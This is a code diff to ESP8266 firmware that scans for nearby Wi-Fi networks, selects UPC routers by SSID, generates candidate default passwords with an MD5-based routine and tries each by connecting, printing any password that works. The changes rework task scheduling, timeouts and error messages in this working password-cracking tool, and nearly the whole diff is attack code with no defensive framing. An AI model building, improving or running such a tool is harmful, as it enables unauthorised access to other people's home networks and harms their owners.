@@ -31,15 +31,19 @@ size_t ap_timeouts;
 static void crack(os_event_t *events);
 static void targets_found(void* arg, STATUS status);
 
+#define user_procTaskQueueLen 1
+os_event_t user_procTaskQueue[user_procTaskQueueLen];
+
 ICACHE_FLASH_ATTR
 static void
 scan(os_event_t *events)
 {
     if(state == SCANNING){
-        wifi_station_scan(NULL, targets_found);
         state = TARGETING;
+        wifi_station_scan(NULL, targets_found);
+    } else {
+        os_printf("Error: not in scanning state\n");
     }
-    system_os_post(SCAN_PRIO, 0, 0 );
 }
 
 // callback for scan
@@ -71,8 +75,9 @@ targets_found(void* arg, STATUS status){
                     aps[last_ap].target += bss_link->ssid[i]-0x30;
                 }
                 ap_to_crack = last_ap;
-                system_os_post(CRACK_PRIO, 0, 0 );
                 state = CRACKING;
+                system_os_task(crack, CRACK_PRIO, user_procTaskQueue, user_procTaskQueueLen);
+                system_os_post(CRACK_PRIO, 0, 0 );
                 // break here to avoid starting another cracking task
                 last_ap++;
                 return;
@@ -82,6 +87,8 @@ targets_found(void* arg, STATUS status){
         bss_link = bss_link->next.stqe_next;
     }
     state = SCANNING;
+    system_os_task(scan, SCAN_PRIO, user_procTaskQueue, user_procTaskQueueLen);
+    system_os_post(SCAN_PRIO, 0, 0 );
 }
 
 char candidate_passwords[8][MAX_CANDIDATE_PASSWORDS];
@@ -91,16 +98,30 @@ ICACHE_FLASH_ATTR
 static void test_passwords(os_event_t *events){
     size_t i;
     if(state != CONNECTING){
+        os_printf("Error: not in connecting state\n");
         return;
     }
 
+    if(ap_timeouts == MAX_TIMEOUTS){
+        os_printf("AP not seen for 10 seconds, aborting\n");
+        current_password = passwords_found;
+    }
+
     if(current_password == passwords_found){
+        os_printf("Finished testing passwords\n");
         // done with testing, go back to scanning
         wifi_station_disconnect();
         wifi_station_set_auto_connect(false);
+        if(!ap_timeouts && !aps[ap_to_crack].password[0]){
+            memcpy(aps[ap_to_crack].password, "<UNKNOWN>", 9);
+        }
         state = SCANNING;
+        system_os_task(scan, SCAN_PRIO, user_procTaskQueue, user_procTaskQueueLen);
         system_os_post(SCAN_PRIO, 0, 0 );
         return;
+    }
+    if(ap_timeouts == MAX_TIMEOUTS){
+        ap_timeouts = 0;
     }
 
     switch(wifi_station_get_connect_status()){
@@ -110,14 +131,14 @@ static void test_passwords(os_event_t *events){
         case STATION_WRONG_PASSWORD:
             os_printf("Wrong password!\n");
             current_password++;
-            wifi_station_disconnect();
-            wifi_station_set_auto_connect(false);
             // fall through
         case STATION_IDLE: {
+            wifi_station_disconnect();
+            wifi_station_set_auto_connect(false);
             ap_timeouts = 0;
             struct station_config config = {0};
             strcpy(config.ssid, aps[ap_to_crack].essid);
-            strcpy(config.password, candidate_passwords[current_password]);
+            strncpy(config.password, candidate_passwords[current_password], 8);
             memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
             config.bssid_set = 0;
             os_printf("Connecting to %s with password %s\n", config.ssid, config.password);
@@ -127,11 +148,6 @@ static void test_passwords(os_event_t *events){
             break;
           }
         case STATION_NO_AP_FOUND:
-            if(ap_timeouts == 100){
-                os_printf("AP not seen for 10 seconds, aborting\n");
-                ap_timeouts = 0;
-                current_password = passwords_found;
-            }
             ap_timeouts++;
             // 100 ms
             os_delay_us(100000);
@@ -152,13 +168,11 @@ static void test_passwords(os_event_t *events){
             os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
             // no need to test more
             current_password = passwords_found;
+            break;
          }
     }
     system_os_post(CONNECT_PRIO, 0, 0 );
 }
-
-#define user_procTaskQueueLen    1
-os_event_t user_procTaskQueue[user_procTaskQueueLen];
 
 ICACHE_FLASH_ATTR
 void user_init()
@@ -171,15 +185,11 @@ void user_init()
 
     system_update_cpu_freq(SYS_CPU_160MHZ);
 
-    // set up tasks
-    system_os_task(test_passwords, CONNECT_PRIO, user_procTaskQueue, user_procTaskQueueLen);
-    system_os_task(crack, CRACK_PRIO, user_procTaskQueue, user_procTaskQueueLen);
-    system_os_task(scan, SCAN_PRIO, user_procTaskQueue, user_procTaskQueueLen);
-
     last_ap = 0;
 
     // start scanning
     state = SCANNING;
+    system_os_task(scan, SCAN_PRIO, user_procTaskQueue, user_procTaskQueueLen);
     system_os_post(SCAN_PRIO, 0, 0 );
 
 }
@@ -263,8 +273,6 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
 }
 
-__attribute__((flatten))
-__attribute__((optimize("Ofast")))
 ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
     uint32_t buf[4];
@@ -272,9 +280,10 @@ static void crack(os_event_t *events){
     char pass[9], tmpstr[17];
     uint8_t h1[16], h2[16];
     uint32_t hv[4], w1, w2, i, cnt = 0;
-	MD5_CTX ctx;
+    MD5_CTX ctx;
 
     if(state != CRACKING){
+        os_printf("Error: not in cracking state\n");
         return;
     }
 
@@ -331,9 +340,10 @@ static void crack(os_event_t *events){
     }
 
     // switch to testing the passwords
+    os_printf("Testing generated passwords\n");
     current_password = 0;
     passwords_found = cnt;
     state = CONNECTING;
+    system_os_task(test_passwords, CONNECT_PRIO, user_procTaskQueue, user_procTaskQueueLen);
     system_os_post(CONNECT_PRIO, 0, 0 );
-    return;
 }
